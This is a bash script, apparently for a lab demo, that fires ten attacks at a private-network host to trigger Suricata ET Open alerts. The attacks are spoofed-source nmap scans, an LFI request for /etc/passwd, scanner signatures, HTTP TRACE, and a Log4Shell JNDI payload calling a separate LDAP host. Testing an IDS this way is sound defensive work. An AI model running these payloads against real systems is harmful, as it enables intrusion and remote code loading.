#!/bin/bash
# Suricata EVE - Automated Attack Script
# Diperbarui dengan 10 Serangan Spesifik untuk Suricata ET Open Rules

TARGET="192.168.216.128"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m' # No Color

# Definisi 10 IP Bayangan
VIRT_IP1="192.168.216.101"
VIRT_IP2="192.168.216.102"
VIRT_IP3="192.168.216.103"
VIRT_IP4="192.168.216.104"
VIRT_IP5="192.168.216.105"
VIRT_IP6="192.168.216.106"
VIRT_IP7="192.168.216.107"
VIRT_IP8="192.168.216.108"
VIRT_IP9="192.168.216.109"
VIRT_IP10="192.168.216.110"

# ─── Helper Functions ─────────────────────────────────────────────────────────

header() {
    echo -e "\n${BLUE}${BOLD}======================================================${NC}"
    echo -e "${CYAN}${BOLD} $1 ${NC}"
    echo -e "${BLUE}${BOLD}======================================================${NC}\n"
}

info() {
    echo -e "${YELLOW}[*]${NC} $1"
}

success() {
    echo -e "${GREEN}[+]${NC} $1"
}

atk() {
    echo -e "${RED}[!]${NC} $1"
}

setup_all_ips() {
    info "Menyiapkan 10 IP Bayangan di antarmuka eth0..."
    for i in {101..110}; do
        ip addr add 192.168.216.$i/24 dev eth0 2>/dev/null
    done
    success "Semua IP Bayangan siap digunakan!"
}

cleanup_all_ips() {
    info "Menghapus semua IP Bayangan dari antarmuka eth0..."
    for i in {101..110}; do
        ip addr del 192.168.216.$i/24 dev eth0 2>/dev/null
    done
    success "Pembersihan selesai."
}

# ─── Attack Modules (Berbasis ET Open Rules) ──────────────────────────────────

do_1_portscan() {
    header "1️⃣  Port Scan (Nmap Aggressive) - IP: .101"
    atk "Mendeteksi port terbuka dan versi service..."
    nmap -S ${VIRT_IP1} -e eth0 -sV -sC -A -T4 -p 1-1000 ${TARGET} -Pn
}

do_2_synscan() {
    header "2️⃣  SYN Stealth Scan (Nmap) - IP: .102"
    atk "Scanning OS secara diam-diam tanpa full koneksi TCP..."
    nmap -S ${VIRT_IP2} -e eth0 -sS -O --osscan-guess -T4 ${TARGET} -Pn
}

do_3_finscan() {
    header "3️⃣  FIN Scan (Nmap) - IP: .103"
    atk "Mengirim paket FIN untuk menembus firewall..."
    nmap -S ${VIRT_IP3} -e eth0 -sF -T4 -p 80,8080,22 ${TARGET} -Pn
}

do_4_xmasscan() {
    header "4️⃣  XMAS Scan (Nmap) - IP: .104"
    atk "Mengirim paket TCP 'Lampu Natal' (FIN, PSH, URG)..."
    nmap -S ${VIRT_IP4} -e eth0 -sX -T4 -p 80,8080,22 ${TARGET} -Pn
}

do_5_lfi() {
    header "5️⃣  Local File Inclusion (/etc/passwd) - IP: .105"
    atk "Membaca file sistem sensitif via URL (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP5} "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_6_morfeus() {
    header "6️⃣  Morfeus Web Scanner (muieblackcat) - IP: .106"
    atk "Memalsukan signature scanner Morfeus lawas (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP6} "http://${TARGET}/muieblackcat"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_7_phpeasteregg() {
    header "7️⃣  PHP Easter Egg Info Disclosure - IP: .107"
    atk "Mengakses halaman rahasia PHP (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP7} "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_8_gobuster() {
    header "8️⃣  Web Directory Scanner (Gobuster) - IP: .108"
    atk "Memalsukan User-Agent Gobuster (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP8} -H "User-Agent: gobuster/3.1.0" "http://${TARGET}/admin/"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_9_log4shell() {
    header "9️⃣  Log4Shell (CVE-2021-44228) - IP: .109"
    atk "Eksploitasi Java Log4j via injeksi JNDI (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP9} -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' "http://${TARGET}/"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_10_httptrace() {
    header "🔟  HTTP TRACE Method (XST) - IP: .110"
    atk "Mengirim metode HTTP TRACE terlarang (dikirim 3x)..."
    for i in {1..3}; do curl -s -o /dev/null --interface ${VIRT_IP10} -X TRACE "http://${TARGET}/"; done
    echo -e "${GREEN}[+] Selesai dikirim 3x!${NC}"
}

do_all() {
    setup_all_ips
    do_1_portscan
    do_2_synscan
    do_3_finscan
    do_4_xmasscan
    do_5_lfi
    do_6_morfeus
    do_7_phpeasteregg
    do_8_gobuster
    do_9_log4shell
    do_10_httptrace
    success "Semua 10 serangan selesai dieksekusi!"
}

# ─── Main Menu ────────────────────────────────────────────────────────────────

# Pastikan dijalankan sebagai root (karena iptables & ip addr butuh akses root)
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Tolong jalankan script ini sebagai root (sudo ./atk.sh)${NC}"
  exit 1
fi

setup_all_ips

while true; do
    echo -e "\n${BLUE}${BOLD}=== SURICATA AUTOMATED ATTACK DEMO ===${NC}"
    echo -e "Target: ${BOLD}http://${TARGET}${NC}\n"
    
    echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan          — Nmap Aggressive    (IP: .101)"
    echo -e "  ${BOLD} 2${NC}) 👻 SYN Scan           — Nmap Stealth       (IP: .102)"
    echo -e "  ${BOLD} 3${NC}) 🏁 FIN Scan           — Nmap Firewall Byp. (IP: .103)"
    echo -e "  ${BOLD} 4${NC}) 🎄 XMAS Scan          — Nmap OS Detection  (IP: .104)"
    echo -e "  ${BOLD} 5${NC}) 📂 LFI                — /etc/passwd        (IP: .105)"
    echo -e "  ${BOLD} 6${NC}) 🐈 Morfeus Scanner    — muieblackcat       (IP: .106)"
    echo -e "  ${BOLD} 7${NC}) 🥚 PHP Easter Egg     — Info Disclosure    (IP: .107)"
    echo -e "  ${BOLD} 8${NC}) 🕷️  Gobuster           — Dir Brute Force    (IP: .108)"
    echo -e "  ${BOLD} 9${NC}) 🐚 Log4Shell          — CVE-2021-44228     (IP: .109)"
    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE         — Cross-Site Tracing (IP: .110)"
    echo -e "  ${BOLD} A${NC}) 🚀 SEMUA SEKALIGUS     — Full demo berurutan"
    echo -e "  ${BOLD} C${NC}) 🧹 Hapus IP Bayangan   — Bersihkan eth0"
    echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
    echo ""
    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-10 / A / C]: " CHOICE

    case $CHOICE in
         1) do_1_portscan ;;
         2) do_2_synscan ;;
         3) do_3_finscan ;;
         4) do_4_xmasscan ;;
         5) do_5_lfi ;;
         6) do_6_morfeus ;;
         7) do_7_phpeasteregg ;;
         8) do_8_gobuster ;;
         9) do_9_log4shell ;;
        10) do_10_httptrace ;;
        [Aa]) do_all ;;
        [Cc]) cleanup_all_ips ;;
         0) cleanup_all_ips; echo "Keluar."; exit 0 ;;
         *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
    esac
    echo ""
    success "Cek dashboard → http://${TARGET}:8080"
done
